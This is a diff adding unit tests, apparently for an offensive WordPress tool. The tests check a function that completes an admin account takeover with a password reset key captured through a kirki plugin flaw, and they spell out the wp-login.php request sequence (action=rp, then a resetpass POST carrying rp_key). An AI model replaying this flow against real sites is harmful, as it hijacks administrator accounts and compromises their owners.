@@ -261,6 +261,48 @@ def test_password_reset_without_nonce_from_does_not_fetch_a_page():
     assert "np" in data and out["password"] == data["np"]
 
 
+# ── complete an OOB account-takeover from a captured reset key (kirki CVE-2026-8206) ─
+# The OOB CVE mails admin's reset link to the attacker; once the operator reads the
+# key out of that inbox, this finishes WP's reset flow: action=rp primes the
+# wp-resetpass cookie, then action=resetpass POSTs the new pw with rp_key (WP
+# hash_equals's it against the cookie's key — a missing rp_key 500s on PHP 8).
+def test_complete_reset_key_primes_cookie_then_posts_password():
+    http = MagicMock()
+    http.post.return_value = MagicMock(status_code=200, text="Your password has been reset. Log in")
+    out = wp_privesc.complete_reset_key("https://t", http, "RESETKEY123", "admin", "NewPass_9x")
+    assert out == {"username": "admin", "password": "NewPass_9x"}
+    # step 1 primes the wp-resetpass cookie via action=rp
+    assert http.get.call_args[0][0] == "https://t/wp-login.php"
+    assert http.get.call_args.kwargs["params"] == {"action": "rp", "key": "RESETKEY123", "login": "admin"}
+    # step 2 posts the new password WITH rp_key echoed
+    assert http.post.call_args[0][0] == "https://t/wp-login.php"
+    assert http.post.call_args.kwargs["params"] == {"action": "resetpass"}
+    d = http.post.call_args.kwargs["data"]
+    assert d["rp_key"] == "RESETKEY123"
+    assert d["pass1"] == "NewPass_9x" and d["pass2"] == "NewPass_9x"
+    assert d["wp-submit"] == "Reset Password"
+
+
+def test_complete_reset_key_generates_password_when_omitted():
+    http = MagicMock()
+    http.post.return_value = MagicMock(status_code=200, text="password has been reset")
+    out = wp_privesc.complete_reset_key("https://t", http, "K", "admin")
+    assert out["username"] == "admin" and len(out["password"]) > 8
+    assert http.post.call_args.kwargs["data"]["pass1"] == out["password"]
+
+
+def test_complete_reset_key_none_on_invalid_key():
+    http = MagicMock()
+    http.post.return_value = MagicMock(status_code=200,
+        text="wp-login.php?action=lostpassword&error=invalidkey")
+    assert wp_privesc.complete_reset_key("https://t", http, "BAD", "admin", "x") is None
+
+
+def test_complete_reset_key_swallows_transport_error():
+    http = MagicMock(); http.get.side_effect = Exception("boom")
+    assert wp_privesc.complete_reset_key("https://t", http, "K", "admin", "x") is None
+
+
 def test_essential_addons_registry_recipe_wires_end_to_end():
     # Uses the REAL registry recipe to catch wiring bugs between wp_recipes'
     # field names and what _password_reset expects.
